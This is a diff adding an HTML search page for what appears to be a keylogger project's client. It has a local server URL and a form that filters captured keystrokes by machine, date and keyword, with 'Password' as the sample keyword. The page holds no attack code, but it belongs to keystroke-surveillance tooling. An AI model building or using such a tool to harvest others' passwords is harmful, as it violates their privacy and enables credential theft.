@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <base href="/client/">
+  <title>Keylogger • search</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body data-page="search">
+  <header>🔎 search</header>
+
+  <main>
+    <div class="serverbar">
+      <input id="baseUrl" type="text" value="http://127.0.0.1:5001" />
+      <a class="btn ghost" href="index.html">← home</a>
+    </div>
+
+    <section class="card">
+      <div class="section-title">filtering</div>
+      <div class="form">
+        <input id="searchMachine" type="text" placeholder="COMPUTER" />
+        <input id="searchDate" type="date" />
+        <input id="searchKeywords" type="text" placeholder="Password" />
+        <button id="btnSearch" class="btn" type="button">search</button>
+      </div>
+      <div id="searchResults" class="results console">(No Result)</div>
+    </section>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
